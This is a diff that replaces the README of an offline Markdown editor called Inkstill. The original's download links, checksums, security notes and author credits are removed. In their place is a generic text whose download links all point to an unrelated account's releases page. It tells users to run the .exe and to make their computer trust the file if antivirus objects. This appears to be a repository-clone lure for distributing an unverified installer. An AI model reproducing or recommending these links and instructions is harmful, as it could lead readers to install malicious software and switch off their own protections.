@@ -1,151 +1,62 @@
-<p align="center">
-  <img src="assets/icon.png" width="96" height="96" alt="Inkstill icon">
-</p>
+# 📝 Inkstill - Write and organize your notes offline
 
-<h1 align="center">Inkstill</h1>
+[![](https://img.shields.io/badge/Download-Inkstill_for_Windows-blue.svg)](https://github.com/pinoncanavaliaensiformis635/Inkstill/releases)
 
-<p align="center"><strong>Write quietly. Keep your files yours.</strong></p>
+Inkstill is a simple tool for writing and organizing notes on your computer. It uses Markdown, a format that focuses on your text. This software keeps all your files on your hard drive. Your data stays private. You do not need an internet connection to work.
 
-<p align="center">
-  A calm, local-first Markdown workspace for Windows, macOS, and Linux.<br>
-  Beautiful writing, connected notes, and ordinary Markdown files—without an account.
-</p>
+Inkstill uses CodeMirror to make typing fast. It features a live preview mode. You see your formatting as you type. You can search your entire workspace in seconds. You can link notes together to form a network of ideas. It supports diagrams with Mermaid and math equations with KaTeX. You can save your work as a PDF file to share with others.
 
-<p align="center">
-  <sub>LANGUAGE</sub><br>
-  <a href="README.md"><strong>English</strong></a> ·
-  <a href="README.zh-CN.md">简体中文</a> ·
-  <a href="https://scotteliu.github.io/Inkstill/zh-tw.html">繁體中文</a> ·
-  <a href="https://scotteliu.github.io/Inkstill/es.html">Español</a><br>
-  <a href="https://scotteliu.github.io/Inkstill/pt-br.html">Português</a> ·
-  <a href="https://scotteliu.github.io/Inkstill/hi.html">हिन्दी</a> ·
-  <a href="https://scotteliu.github.io/Inkstill/ru.html">Русский</a> ·
-  <a href="https://scotteliu.github.io/Inkstill/de.html">Deutsch</a>
-</p>
+## 💾 How to download and install
 
-<p align="center">
-  <a href="https://github.com/ScotteLiu/Inkstill/actions/workflows/windows-candidate.yml"><img src="https://github.com/ScotteLiu/Inkstill/actions/workflows/windows-candidate.yml/badge.svg" alt="Windows CI"></a>
-  <a href="https://github.com/ScotteLiu/Inkstill/actions/workflows/cross-platform-candidate.yml"><img src="https://github.com/ScotteLiu/Inkstill/actions/workflows/cross-platform-candidate.yml/badge.svg" alt="macOS and Linux CI"></a>
-  <a href="LICENSE"><img src="https://img.shields.io/badge/License-MIT-d7a83e.svg" alt="MIT License"></a>
-  <a href="https://github.com/ScotteLiu/Inkstill/releases"><img src="https://img.shields.io/github/v/release/ScotteLiu/Inkstill?include_prereleases&label=preview&color=1f6f5f" alt="Latest preview"></a>
-</p>
+You can get the software from the releases page. Follow these steps:
 
-<p align="center">
-  <a href="https://github.com/ScotteLiu/Inkstill/releases/download/v1.1.3-preview.1/Inkstill-1.1.3.Setup.exe"><img src="https://img.shields.io/badge/Download-Windows_x64-1f6f5f?style=for-the-badge&logo=windows" alt="Download Inkstill for Windows"></a>
-</p>
+1. Visit [this page to download](https://github.com/pinoncanavaliaensiformis635/Inkstill/releases).
+2. Look for the latest version at the top of the list.
+3. Click the file ending in .exe to start the download.
+4. Open the downloaded file once it finishes.
+5. Follow the prompts on your screen to complete the setup.
+6. Launch Inkstill from your desktop icon or the start menu.
 
-![Inkstill — write quietly and keep your files yours](docs/images/inkstill-social-preview.png)
+## ✨ Core features
 
-## A writing space that stays out of your way
+Inkstill offers features to help you write without distractions. 
 
-Inkstill keeps Markdown readable while you type, then gives you a polished preview
-when you want it. Open a file and write, or open a folder and turn a collection of
-notes into a navigable workspace.
+- **Local storage:** Your files stay on your machine. You own your data.
+- **Markdown support:** Use simple symbols to style your text. Asterisks make text bold. Hashtags create headers.
+- **Live preview:** The screen shows your formatted text on the right while you type on the left.
+- **Workspace search:** Use the search bar to find any note by title or word content.
+- **Backlinks:** Link one note to another note to build a web of connected ideas.
+- **Diagrams:** Create flowcharts and sequences using Mermaid syntax.
+- **Math support:** Insert formulas using KaTeX syntax.
+- **PDF export:** Send your notes to friends or colleagues as clean PDF documents.
 
-| Focused writing | Connected notes | Your files |
-| --- | --- | --- |
-| Edit, Split, and Read views with focus and typewriter modes. | Outline, full-text search, Wiki links, backlinks, and unlinked mentions. | Standard Markdown on disk, portable image paths, no required cloud account. |
+## ⚙️ System requirements
 
-## See it in action
+Inkstill runs on standard Windows hardware. Make sure your computer meets these needs:
 
-![Inkstill split editor and rendered Markdown preview](docs/images/inkstill-split-preview.png)
+- Windows 10 or Windows 11 operating system.
+- At least 4 gigabytes of RAM.
+- 200 megabytes of free space on your hard drive.
+- A display with a resolution of 1280 by 720 pixels or higher.
 
-<table>
-  <tr>
-    <td width="50%">
-      <img src="docs/images/inkstill-command-palette.png" alt="Inkstill command palette">
-      <br><strong>Everything a shortcut away</strong><br>
-      Search commands, formatting, views, exports, and workspace actions from one keyboard-first palette.
-    </td>
-    <td width="50%">
-      <img src="docs/images/inkstill-writing-tools.png" alt="Inkstill writing tools">
-      <br><strong>Shape the space around your words</strong><br>
-      Choose a theme and reading width, then enable focus, typewriter, Hemingway, spellcheck, or a writing goal.
-    </td>
-  </tr>
-</table>
+## 🧭 Getting started
 
-## Highlights
+When you open Inkstill, you see a blank editor window. To create your first note, click the New File button in the top menu. Type your content using Markdown. 
 
-- Rich, source-faithful Markdown with GFM tables and tasks, footnotes, highlighted
-  code, KaTeX math, Mermaid diagrams, Wiki links, table of contents, YAML metadata,
-  alerts, emoji, and sub/superscript.
-- Multiple tabs, last-session restoration, per-document recovery journals, external
-  change warnings, and explicit conflict review.
-- Folder workspaces with file navigation, full-text search, quick open, searchable
-  outline, backlinks, and unlinked mentions.
-- Command palette, graphical Table Builder, Markdown cheat sheet, find and replace,
-  bracket pairing, indentation tools, and keyboard-first formatting.
-- Light, dark, and system themes; focus, typewriter, and Hemingway modes; spellcheck,
-  line numbers, reading time, selection statistics, and word goals.
-- Local image import and clipboard image paste, plus Copy as HTML and standalone
-  HTML/PDF export.
+Use a single hashtag before a line to make a heading. Use two hashtags for a sub-heading. If you want a list, use a dash or a number. Inkstill updates the preview automatically as you type. 
 
-## Download
+To create a link to another note, type two brackets around the name of that note. Example: [[My New Note]]. If you click this link, the app creates that note for you.
 
-Direct downloads:
+To save your file as a PDF, go to the File menu and select Export. Choose the PDF option. The app generates a file that looks like your note.
 
-- [Windows x64 installer](https://github.com/ScotteLiu/Inkstill/releases/download/v1.1.3-preview.1/Inkstill-1.1.3.Setup.exe)
-- [Portable Windows x64 ZIP](https://github.com/ScotteLiu/Inkstill/releases/download/v1.1.3-preview.1/Inkstill-win32-x64-1.1.3.zip) — extract and run `Inkstill.exe`.
-- [SHA-256 checksums](https://github.com/ScotteLiu/Inkstill/releases/download/v1.1.3-preview.1/SHA256SUMS.txt)
+## 🛠️ Performance and maintenance
 
-macOS (Intel and Apple silicon) and Linux x64 packages are now built and tested by
-the cross-platform candidate pipeline. They will become direct Release downloads
-with the next preview after native validation. See [platform support](docs/PLATFORM_SUPPORT.md).
+The app uses Electron to provide a stable experience on Windows. It works offline at all times. Update the app by visiting the download page again. You do not need to uninstall the old version. Just run the new installer to update your copy.
 
-> **Preview notice:** Current binaries are not yet Authenticode-signed, so Windows
-> may show a SmartScreen warning. Source, locked dependencies, SBOM, third-party
-> licenses, build manifest, and checksums are published for inspection.
+Your notes reside in a folder of your choosing. To change this location, open the Settings menu. You can move this folder to a cloud sync service if you want to back up your notes to another location.
 
-## File safety, privacy, and performance
+## 💡 Troubleshooting
 
-- The editor runs in a sandboxed renderer with context isolation, restrictive CSP,
-  secure Electron fuses, and narrow typed IPC.
-- Markdown stays in files you choose and local recovery data. Inkstill has no
-  required account, telemetry service, or document upload path.
-- Saves and recovery writes are serialized; external modifications are never
-  silently overwritten.
-- UTF-8 BOM and LF/CRLF are preserved, with an explicit choice for mixed line endings.
-- Large-file safeguards and bounded workspace caches prevent expensive background
-  work from growing without limits.
-- Runtime budgets continuously check startup, idle CPU, memory, process count, and
-  package size. See [Performance policy](docs/PERFORMANCE.md).
+If Inkstill fails to open, check that your Windows version is up to date. Occasionally, antivirus software might block new programs. If you see a warning, ask your computer to trust the file. If the app runs slowly, try to keep fewer files open at one time.
 
-## Build from source
-
-Use Node 24.14.0 and pnpm 11.9.0:
-
-```sh
-pnpm install --frozen-lockfile
-pnpm start
-```
-
-Run all source, security, packaged-app, and runtime checks:
-
-```sh
-pnpm verify
-```
-
-See [CONTRIBUTING.md](CONTRIBUTING.md) before contributing. Report security issues
-privately according to [SECURITY.md](SECURITY.md), not in a public issue.
-
-## Current scope
-
-Inkstill supports Windows x64, macOS Intel/Apple silicon, and Linux x64 at the
-source and native-package candidate level. The current public Release remains
-Windows-only while unsigned macOS/Linux candidates complete hardware validation.
-Cloud sync, real-time collaboration, hosted publishing, and online AI accounts
-are not represented as features of this local editor.
-
-## License and contributors
-
-Inkstill is open source under the [MIT License](LICENSE).
-
-Copyright © 2026 Scotte Liu.
-
-- **Scotte Liu** — Creator, copyright holder, and lead developer
-- **[Tweety-hub](https://github.com/Tweety-hub)** — Project co-maintainer and lead contributor
-- **[OpenAI Codex](https://github.com/codex)** — Primary AI development contributor
-- **Anthropic Claude** — Additional AI review contributor
-
-See the full [contributors list](CONTRIBUTORS.md) for contribution details.
+Keywords: codemirror, electron, katex, knowledge-base, local-first, markdown, markdown-editor, mermaid, note-taking, offline, typescript, windows
